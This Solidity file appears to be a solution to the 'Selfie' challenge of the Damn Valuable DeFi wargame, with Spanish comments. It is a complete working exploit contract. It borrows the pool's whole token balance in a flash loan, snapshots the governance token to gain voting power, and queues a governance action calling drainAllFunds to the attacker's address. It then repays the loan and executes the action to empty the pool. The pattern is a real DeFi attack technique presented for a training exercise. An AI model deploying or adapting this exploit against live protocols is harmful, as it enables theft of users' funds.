// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../6_selfie/SelfiePool.sol";
import "../6_selfie/SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";
import "hardhat/console.sol";

contract SelfieAttacker {
  address attackerAddress;
  uint256 evilActionId;

  SelfiePool selfiePool;
  SimpleGovernance simpleGovernance;
  DamnValuableTokenSnapshot damnValuableTokenSnapshot;

  constructor(address _selfiePool,address _simpleGovernance,address _damnValuableTokenSnapshot,address _attackerAddress) {
    selfiePool = SelfiePool(_selfiePool);
    simpleGovernance = SimpleGovernance(_simpleGovernance);
    damnValuableTokenSnapshot = DamnValuableTokenSnapshot(_damnValuableTokenSnapshot);
    attackerAddress = _attackerAddress;
  }

  function attack() public {
    selfiePool.flashLoan(damnValuableTokenSnapshot.balanceOf(address(selfiePool)));
  }

  function receiveTokens(address pool, uint256 borrowAmount) external {
    console.log("INICIANDO RECEIVE TOKENS DE SELFIE ATTACKER");
    // Preparo el payload que iría en el atributo "data" de la accion a agregar
    bytes memory payload = abi.encodeWithSignature("drainAllFunds(address)", attackerAddress);

    // Tomo snapshot para dejar sentado que somos millonarios con el flashloan.
    damnValuableTokenSnapshot.snapshot();
    // uint balanceEnSnapshot = damnValuableTokenSnapshot.getBalanceAtLastSnapshot(address(this));
    // console.log(balanceEnSnapshot);
    evilActionId = simpleGovernance.queueAction(address(selfiePool),payload,0);
    // Devuelvo el flashloan para pasar el require final del método flashLoan en SelfiePool.
    damnValuableTokenSnapshot.transfer(address(selfiePool),borrowAmount);
  }

  function getEvilActionId() public view returns (uint256) {
    return evilActionId;
  }

  function finishHim() public {
    console.log("FINISH HIM SCORPION!");
    simpleGovernance.executeAction(evilActionId);
  }
}